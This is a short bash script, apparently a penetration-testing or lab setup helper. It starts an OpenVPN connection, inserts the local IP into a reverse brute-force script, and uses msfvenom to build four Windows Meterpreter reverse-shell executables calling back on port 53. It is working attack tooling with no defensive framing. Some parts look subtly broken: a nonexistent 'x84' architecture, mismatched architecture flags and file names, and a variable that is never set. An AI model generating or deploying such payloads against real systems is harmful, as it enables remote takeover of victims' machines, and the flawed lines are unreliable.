#!/bin/bash

nohup openvpn $HOME/hack/*.ovpn 1>&2 2>/dev/null &
sleep 10
sed -i -e "s/LIP/$lip/" $HOME/fileserver/lin/reverse_brute.sh
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lport=53 lhost=$lip -f exe > $HOME/fileserver/win/meterpreterx64_p53.exe
msfvenom -p windows/x84/meterpreter/reverse_tcp -a x86 lport=53 lhost=$lip -f exe > $HOME/fileserver/win/meterpreterx86_p53.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x86 lport=53 lhost=$lip -f exe > $HOME/fileserver/lin/meterpreterx86_p53.exe
msfvenom -p windows/x86/meterpreter/reverse_tcp -a x64 lport=53 lhost=$lip -f exe > $HOME/fileserver/lin/meterpreterx64_p53.exe
